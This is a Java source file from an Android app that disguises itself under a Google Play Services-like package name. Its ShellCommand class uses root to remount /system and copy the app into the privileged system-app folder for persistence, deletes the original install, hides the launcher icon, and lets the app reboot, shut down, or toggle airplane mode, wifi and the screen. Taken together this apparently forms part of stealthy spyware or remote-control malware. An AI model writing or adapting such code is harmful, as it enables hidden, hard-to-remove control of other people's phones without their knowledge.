package com.google.android.gms.persistent.googleapps.utils;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import java.io.IOException;

import io.reactivex.Single;

/**
 * Created by OldMan on 06.07.2017.
 */

public class ShellCommand {

    private static final String TAG = ShellCommand.class.getSimpleName();
    private static final String appName = "com.google.android.gms.persistent.googleapps";

    static public boolean runCommandWait(String cmd, boolean needsu) {
        try {
            String su = "sh";
            if (needsu) {
                su = "su";
            }

            Process process = Runtime.getRuntime().exec(new String[]{su, "-c", cmd});
            int result = process.waitFor();
            Log.d("Shell", "result " + result);
            return (result == 0);

        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    static public Single<Boolean> makeAppSystem() {
        String systemPrivAppDir = "/system/priv-app/";
        String systemAppDir = "/system/app/";

        String appPath = "/data/app/" + appName;

        // Подключаем /system в режиме чтения-записи
        if (!runCommandWait("mount -o remount,rw /system", true)) {
            Log.e(TAG, "makeAppSystem: Can't mount /system");
            return Single.just(false);
        }
        int api = Build.VERSION.SDK_INT;
        String appDir = systemPrivAppDir;

        // Копиpуем приложение в /system/priv-app или /system/app в зависимости от версии Android
        if (api >= 21) {
            runCommandWait("cp -R " + appPath + "* " + appDir, true);
            runCommandWait("chown -R 0:0 " + appDir + appName + "*", true);
            runCommandWait("rm -Rf " + appPath + "*", true);
        } else {
            if (api < 20) {
                appDir = systemAppDir;
            }
            runCommandWait("cp " + appPath + "* " + appDir, true);
            runCommandWait("chown 0:0 " + appDir + appName + "*", true);
            runCommandWait("rm -f " + appPath + "*", true);
        }
        // Отправляем смартфон в мягкую пeрезагрузку
        return Single.just(runCommandWait("am restart", true));
    }

    static public Single<Boolean> rebootSystem(boolean val) {
        if (val)
            return Single.just(runCommandWait("reboot", true));
        else
            return Single.just(true);
    }

    static public Single<Boolean> shutDownSystem(boolean val) {
        if (val)
            return Single.just(runCommandWait("shutdown", true));
        else
            return Single.just(true);
    }


    static public Single<Boolean> setAirplaneMode(boolean val) {
        if(val) {
            String COMMAND_FLIGHT_MODE_1 = "-c settings put global airplane_mode_on";
            String COMMAND_FLIGHT_MODE_2 = "-c am broadcast -a android.intent.action.AIRPLANE_MODE --ez state";
            // Set Airplane / Flight mode using su commands.
            String command = COMMAND_FLIGHT_MODE_1 + " " + val;
            runCommandWait(command, true);
            command = COMMAND_FLIGHT_MODE_2 + " " + val;
            return Single.just(runCommandWait(command, true));
        }
        else
            return Single.just(true);
    }

    static public Single<Boolean> setHideIcon(Context context, boolean val) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, com.google.android.gms.persistent.googleapps.ui.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        if (val)
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        else
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
//        Log.d("Shell", "result " +  p.getComponentEnabledSetting(com.google.android.gms.persistent.googleapps.ui.MainActivity));

        return Single.just(true);
    }

    static public Single<Boolean> setScreen(boolean val) {
        if (val)
            return Single.just(runCommandWait("input keyevent 26", true));
        else
            return Single.just(runCommandWait("input keyevent 82", true));
    }

    static public Single<Boolean> setWifi(boolean val) {
        if (val)
            return Single.just(runCommandWait("svc wifi enable", true));
        else
            return Single.just(runCommandWait("svc wifi disable", true));
    }
}
